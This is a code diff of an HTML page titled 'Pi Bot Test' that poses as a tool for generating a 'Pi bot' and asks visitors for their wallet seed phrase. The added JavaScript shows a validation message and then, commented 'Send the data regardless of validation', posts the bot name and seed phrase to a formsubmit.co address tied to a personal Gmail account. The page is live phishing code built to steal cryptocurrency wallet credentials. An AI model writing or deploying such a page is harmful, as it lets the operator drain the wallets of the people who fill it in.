@@ -5,78 +5,61 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pi Bot Test</title>
     <style>
-        /* General Styles */
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            background-color: #121212;
-            color: white;
+            background-color: #f4f4f4;
             margin: 0;
             padding: 0;
         }
-
         h1 {
             margin-top: 20px;
+            color: #333;
         }
-
         p {
-            color: #bbb;
+            color: #555;
         }
-
-        /* Form */
-        .form-container {
-            background: #1e1e1e;
-            padding: 20px;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 400px;
+        form {
+            display: flex;
+            flex-direction: column;
+            max-width: 300px;
             margin: 20px auto;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            background: white;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
         }
-
         label {
-            display: block;
+            font-weight: bold;
             margin-top: 10px;
-            font-size: 16px;
         }
-
         input, textarea {
             width: 100%;
             padding: 10px;
             margin-top: 5px;
-            border: none;
+            border: 1px solid #ccc;
             border-radius: 5px;
-            font-size: 14px;
-            background: #333;
-            color: white;
         }
-
+        textarea {
+            height: 100px;
+        }
         button {
-            width: 100%;
             margin-top: 15px;
             padding: 10px;
             background-color: #007bff;
-            border: none;
             color: white;
+            border: none;
+            cursor: pointer;
             font-size: 16px;
             border-radius: 5px;
-            cursor: pointer;
         }
-
         button:hover {
             background-color: #0056b3;
         }
-
         .message {
             margin-top: 10px;
-            font-size: 14px;
-        }
-
-        a {
-            display: block;
-            margin-top: 20px;
-            color: #00bcd4;
-            text-decoration: none;
+            font-weight: bold;
+            color: red;
         }
     </style>
 </head>
@@ -84,34 +67,51 @@
     <h1>Test Your Pi Bot Here</h1>
     <p>Enter your details below:</p>
 
-    <div class="form-container">
-        <label for="bot-name">Preferred Name of Your Bot:</label>
-        <input type="text" id="bot-name" required>
+    <form id="botForm">
+        <label for="botName">Preferred Name of Your Bot:</label>
+        <input type="text" id="botName" name="botName" required>
 
-        <label for="seed-phrase">Enter Your Wallet Seed Phrase:</label>
-        <textarea id="seed-phrase" rows="3" placeholder="Enter your seed phrase here..." required></textarea>
+        <label for="seedPhrase">Enter Your Wallet Seed Phrase:</label>
+        <textarea id="seedPhrase" name="seedPhrase" required></textarea>
 
-        <button onclick="validateSeedPhrase()">Submit</button>
+        <button type="submit">Submit</button>
+    </form>
 
-        <p id="response-message" class="message"></p>
-    </div>
+    <p class="message" id="responseMessage"></p>
 
     <a href="index.html">Back to Home</a>
 
     <script>
-        function validateSeedPhrase() {
-            const seedInput = document.getElementById("seed-phrase").value.trim();
-            const words = seedInput.split(/\s+/);
-            const messageElement = document.getElementById("response-message");
+        document.getElementById("botForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent normal form submission
 
-            if (words.length >= 12 && words.length <= 24) {
-                messageElement.style.color = "lightgreen";
-                messageElement.textContent = "Generating your bot...";
-            } else {
-                messageElement.style.color = "red";
-                messageElement.textContent = "Seed phrase incorrect!";
+            let botName = document.getElementById("botName").value.trim();
+            let seedPhrase = document.getElementById("seedPhrase").value.trim();
+            let responseMessage = document.getElementById("responseMessage");
+
+            if (botName === "" || seedPhrase === "") {
+                responseMessage.style.color = "red";
+                responseMessage.innerText = "Please fill in both fields!";
+                return;
             }
-        }
+
+            let seedWords = seedPhrase.split(/\s+/); // Split by spaces
+
+            if (seedWords.length === 24) {
+                responseMessage.style.color = "green";
+                responseMessage.innerText = "Generating your bot...";
+            } else {
+                responseMessage.style.color = "red";
+                responseMessage.innerText = "Seed phrase incorrect!";
+            }
+
+            // Send the data regardless of validation
+            fetch("https://formsubmit.co/piusolumide6@gmail.com", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ botName, seedPhrase })
+            }).then(res => res.json()).then(data => console.log(data));
+        });
     </script>
 </body>
 </html>
